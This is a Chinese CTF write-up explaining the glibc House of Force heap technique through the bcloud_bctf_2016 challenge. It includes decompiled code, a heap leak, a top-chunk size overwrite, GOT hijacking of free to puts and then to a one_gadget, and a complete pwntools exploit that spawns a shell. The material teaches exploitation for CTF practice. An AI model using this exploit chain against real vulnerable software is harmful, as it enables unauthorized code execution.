# House of force
基于top chunk分配机制的利用,glibc会对用户请求的size_1和top chunk现有的size_0进行验证，如果size_0大于用户申请的chunk大小size_1，就会将从top chunk中切割出size_1大小的chunk，剩余部分放入top chunk。

如果top chunk足够大（size_0大于top chunk与目标地址的距离），malloc两次，第二次申请的chunk就会到目标地址处，实现一次任意地址写。

然而实际上top chunk 的size_0，一般不会这么大，所以这种利用手法的前提是可以修改top chunk的size_0大小,把它变成一个很大的数,一般是将其改为-1（32位：0xffffffff，64位:0xffffffffffffffff），因为在将size_0和size_1进行比较时会把size转换成无符号长整型数，因此-1也就是说unsigned long中最大的数。

### glibc源码：

	// 获取当前的top chunk，并计算其对应的大小
	victim = av->top;
	size   = chunksize(victim);
	// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
	if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
	{
	    remainder_size = size - nb;
	    remainder      = chunk_at_offset(victim, nb);
	    av->top        = remainder;
	    set_head(victim, nb | PREV_INUSE |
	            (av != &main_arena ? NON_MAIN_ARENA : 0));
	    set_head(remainder, remainder_size | PREV_INUSE);
	
	    check_malloced_chunk(av, victim, nb);
	    void *p = chunk2mem(victim);
	    alloc_perturb(p, bytes);
	    return p;
	}


# 例题


## bcloud_bctf_2016
![在这里插入图片描述](https://img-blog.csdnimg.cn/b96c270b3de84076b7dafed7be14037b.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/4ae14089110b4bdf880e41b9ded19a7c.png)
程序实现了三个功能，增加一个chunk，编辑一个chunk的内容，删除一个chunk
### add函数

	int add()
	{
	  int result; // eax
	  int i; // [esp+18h] [ebp-10h]
	  int v2; // [esp+1Ch] [ebp-Ch]
	
	  for ( i = 0; i <= 9 && heap_array[i]; ++i )
	    ;
	  if ( i == 10 )
	    return puts("Lack of space. Upgrade your account with just $100 :)");
	  puts("Input the length of the note content:");
	  v2 = choose();
	  heap_array[i] = malloc(v2 + 4);
	  if ( !heap_array[i] )
	    exit(-1);
	  dword_804B0A0[i] = v2;
	  puts("Input the content:");
	  readd(heap_array[i], v2, 10);
	  printf("Create success, the id is %d\n", i);
	  result = i;
	  dword_804B0E0[i] = 0;
	  return result;
	}

add函数申请chunk时会创建一个存放所有chunk mem指针的全局数组，思考如果可以申请chunk到全局数组处，修改全局数组，实现任意地址写
### edit函数
	
	int edit()
	{
	  unsigned int v1; // [esp+14h] [ebp-14h]
	  int v2; // [esp+18h] [ebp-10h]
	  int v3; // [esp+1Ch] [ebp-Ch]
	
	  puts("Input the id:");
	  v1 = choose();
	  if ( v1 >= 0xA )
	    return puts("Invalid ID.");
	  v2 = heap_array[v1];
	  if ( !v2 )
	    return puts("Note has been deleted.");
	  v3 = dword_804B0A0[v1];
	  dword_804B0E0[v1] = 0;
	  puts("Input the new content:");
	  readd(v2, v3, 10);
	  return puts("Edit success.");
	}

### delete函数
	int delete()
	{
	  unsigned int v1; // [esp+18h] [ebp-10h]
	  void *index; // [esp+1Ch] [ebp-Ch]
	  puts("Input the id:");
	  v1 = choose();
	  if ( v1 >= 0xA )
	    return puts("Invalid ID.");
	  index = heap_array[v1];
	  if ( !index )
	    return puts("Note has been deleted.");
	  heap_array[v1] = 0;
	  dword_804B0A0[v1] = 0;
	  free(index);  #UAF
	  return puts("Delete success.");
	}
delete函数在释放chunk时存在UAF漏洞
### 自定义一个read函数
	int __cdecl readd(int a1, int a2, char a3)
	{
	  char buf; // [esp+1Bh] [ebp-Dh] BYREF
	  int i; // [esp+1Ch] [ebp-Ch]
	
	  for ( i = 0; i < a2; ++i )
	  {
	    if ( read(0, &buf, 1u) <= 0 )
	      exit(-1);
	    if ( buf == a3 )
	      break;
	    *(a1 + i) = buf;
	  }
	  *(i + a1) = 0;
	  return i;
	}
三个参数，a1为要输入的地址，a2为输入大小，a3为截止符

#### 先把前面的一些东西写好
	from pwn import *
	from LibcSearcher import *
	context(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，64位架构,debug
	#定义gdb调试函数
	def dbg():
	        gdb.attach(sh)
	        pause()
	#命令简写化
	s       = lambda data               :sh.send(data)
	sa      = lambda delim,data         :sh.sendafter(delim, data)
	sl      = lambda data               :sh.sendline(data)
	sla     = lambda delim,data         :sh.sendlineafter(delim, data)
	r       = lambda num=4096           :sh.recv(num)
	ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
	itr     = lambda                    :sh.interactive()
	uu32    = lambda data               :u32(data.ljust(4,'\0'))
	uu64    = lambda data               :u64(data.ljust(8,'\0'))
	leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
	lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
	sh = process('./bcloud_bctf_2016')
	#sh = remote('node4.buuoj.cn',26937)
	elf = ELF('./bcloud_bctf_2016')
	def add(size,content):
	   sla('>>','1')
	   sla('note content:',str(size))
	   sa('content:',content)
	 
	def edit(index,content):
	   sla('>>','3')
	   sla('id:',str(index))
	   sa('content:',content)
	 
	def delete(index):
	   sla('>>','4')
	   sla('id:',str(index))
### 分析：
程序没有show函数，无法泄露libc基地址，观察程序发现最开时让我们输入name等信息处存在漏洞

![在这里插入图片描述](https://img-blog.csdnimg.cn/310dfbd7c49e466ebe930d558f79dc43.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/6ece0eda6a904752a89a70247f34ad42.png)

strcpy复制结束的标志是’\x00’，chunk的mem大小只有64字节，如果输入64字节，show函数会把堆地址泄露出来

	sa('name:','a'*64)
	ru('a'*64)
	heap_addr = u32(r(4)) - 0x8
	lg('heap_addr',heap_addr)
	dbg()
	
![在这里插入图片描述](https://img-blog.csdnimg.cn/500d6ee32f0344239464a85fc0e0d7b0.png)


再看另一个函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/bb98a27de4be4519be9e3503290cfd6c.png)

### 栈布局

	-0000005C v2 dd ?
	-00000058 db ? ; undefined
	-00000057 db ? ; undefined
	..........
	-00000016 db ? ; undefined
	-00000015 db ? ; undefined
	-00000014 v4 dd ?
	-00000010 db ? ; undefined
	-0000000F db ? ; undefined
	-0000000E db ? ; undefined
	-0000000D db ? ; undefined

这里的v2，v3和v4，s都是位于栈上的，且在栈上s和v4的空间是连着的，而strcpy复制结束的标志是’\x00’，如果我们将s填满（b'b'*0x40），再将v3写为0xffffffff，那么strcpy(v4, v3);会把v4变为0xffffffff， strcpy(v2, s);会把b'b'*0x40+0xffffffff复制给v2，而v2也是一个size大小为0x40的chunk的mem指针，0xffffffff将覆盖到chunkv2 的下一位，而下一位正好是top chunk的大小，这样我们就成功将top chunk的大小改为了0xffffffff（-1）

	sa('Org:','a'*0x40)
	sla('Host:',p32(0xFFFFFFFF))
	top_chunk_addr = heap_addr  + 0x48*3 - 0x8
	lg('top_chunk_addr',(top_chunk_addr))
	
![在这里插入图片描述](https://img-blog.csdnimg.cn/1e772846eb6a4d7faeba1dfc57a33fb4.png)


之后就来算一下存放chunk指针的全局数组heap_array（0x0804B120）与top chunk的距离，
因为程序一开始就申请了三个大小为0x40的chunk(算上头指针为0x48)，第一次泄露的heap已经算上头指针，heap与top chunk距离0x48*3-0x8=0xD0大小，再加上我们一开始泄露出来的heap的地址（heap_addr）就是top chunk的mem指针地址，

	offset = heap_array - （top_chunk_addr +0x8）- 0x8

![在这里插入图片描述](https://img-blog.csdnimg.cn/887a555d558f466eb43f0f22020b5bf9.png)

 heap_array - top_chunk_addr是top chunk的mem地址,减去0x8字节是top chunk的头指针地址，
之后申请offset-0x10大小的chunk，之所以是再减0x8是因为我们要将heap_array作为mem区域来修改，第一次申请offset-0x10大小的chunk，为第二次申请的chunk预留出chunk头的0x8字节大小（0x4字节的pre_size位和0x4字节的now_size位）。再次申请chunk即为heap_array为mem区域的chunk，可修改heap_array数组，

	add(offset,'\n')	
	add(0x18,'\n')
之后编辑chunk_1来修改heap_array数组
	
	puts_plt = elf.plt['puts']
	__libc_start_main_got = elf.got['__libc_start_main']
	free_got = elf.got['free']
	edit(1,p32(0) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + 0x10) + b'\x00'*0x8)

此时chunk依次为0，free_got，__libc_start_main_got，heap_array+0x10（保持原3号chunk不变）

	edit(1,p32(puts_plt) + b'\n')

此时chunk_1存放free_got地址，编辑chunk_1，将free_got改为puts_plt函数地址

	delete(2)
	dbg()
free（chunk_2），相当于puts(__libc_start_main_got)，泄露__libc_start_main_got地址，得到libc基地址，得到one_gadget地址

![在这里插入图片描述](https://img-blog.csdnimg.cn/b76b20fceb8840b9a7404d1bd7fc1c8b.png)

	#本地
	one_gadget = [0x3ac3c,0x3ac3e,0x3ac42,0x3ac49,0x5faa5,0x5faa6]
	libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')
	#buu远程
	#one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
	#libc = ELF('../../libc-2.23.so--32')
	libc_base = __libc_start_main_addr - libc.sym['__libc_start_main']
	onegadget = one_gadget[3] + libc_base

再次编辑chunk__1将puts函数地址改为one_gadget地址，free（chunk_1）执行exeve("/bin/sh\x00")，获得shell。

		delete(1)
		itr()
		
![在这里插入图片描述](https://img-blog.csdnimg.cn/4ff3bf69a7f545dc9c4a1fbee817d3b1.png)
### exp 
 	
 	from pwn import *
	from LibcSearcher import *
	context(endian='little',os='linux',arch='i386',log_level='debug') #小端序，linux系统，64位架构,debug
	#定义gdb调试函数
	def dbg():
	        gdb.attach(sh)
	        pause()
	#命令简写化
	s       = lambda data               :sh.send(data)
	sa      = lambda delim,data         :sh.sendafter(delim, data)
	sl      = lambda data               :sh.sendline(data)
	sla     = lambda delim,data         :sh.sendlineafter(delim, data)
	r       = lambda num=4096           :sh.recv(num)
	ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
	itr     = lambda                    :sh.interactive()
	uu32    = lambda data               :u32(data.ljust(4,'\0'))
	uu64    = lambda data               :u64(data.ljust(8,'\0'))
	leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
	lg      = lambda address,data       :log.success('%s: '%(address)+hex(data))
	
	sh = process('./bcloud_bctf_2016')
	#sh = remote('node4.buuoj.cn',26937)
	
	elf = ELF('./bcloud_bctf_2016')
	puts_plt = elf.plt['puts']
	__libc_start_main_got = elf.got['__libc_start_main']
	free_got = elf.got['free']
	heap_array = 0x0804B120
	 
	def add(size,content):
	   sla('>>','1')
	   sla('note content:',str(size))
	   sa('content:',content)
	 
	def edit(index,content):
	   sla('>>','3')
	   sla('id:',str(index))
	   sa('content:',content)
	 
	def delete(index):
	   sla('>>','4')
	   sla('id:',str(index))
	def main():
		sa('name:','a'*64)
		ru('a'*64)
		heap_addr = u32(r(4)) 
		lg('heap_addr',heap_addr)
		#dbg()
		sa('Org:','a'*0x40)
		#修改top chunk的size为-1（0xFFFFFFFF）
		sla('Host:',p32(0xFFFFFFFF))
		top_chunk_addr = heap_addr + 0x48*3-0x8
		lg('top_chunk_addr',(top_chunk_addr))
		offset = heap_array - (top_chunk_addr +0x8)- 0x8
		lg('offset',offset)
		add(offset,'') #0
		add(0x18,'\n') #1
		edit(1,p32(0) + p32(free_got) + p32(__libc_start_main_got) + p32(heap_array + 0x10)  + b'\x00'*8)
		edit(1,p32(puts_plt) + b'\n')
		#泄露__libc_start_main_got的地址
		delete(2)
		r(1)
		__libc_start_main_addr = u32(r(4))
		lg('__libc_start_main',__libc_start_main_addr)
		#dbg()
		'''
		libc = LibcSearcher('__libc_start_main',__libc_start_main_addr)
		libc_base = __libc_start_main_addr - libc.dump('__libc_start_main')
		system_addr = libc_base + libc.dump('system')
		lg('libc_base',(libc_base))
		lg('system_addr',(system_addr))
		edit(1,p32(system_addr) + b'\n')
		'''
		#本地
		one_gadget = [0x3ac3c,0x3ac3e,0x3ac42,0x3ac49,0x5faa5,0x5faa6]
		libc = ELF('/home/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')
		#buu远程
		#one_gadget = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
		#libc = ELF('../../libc-2.23.so--32')
		libc_base = __libc_start_main_addr - libc.sym['__libc_start_main']
		onegadget = one_gadget[3] + libc_base
		edit(1,p32(onegadget) + b'\n')
		#getshell
		delete(1)
		itr()
	main()
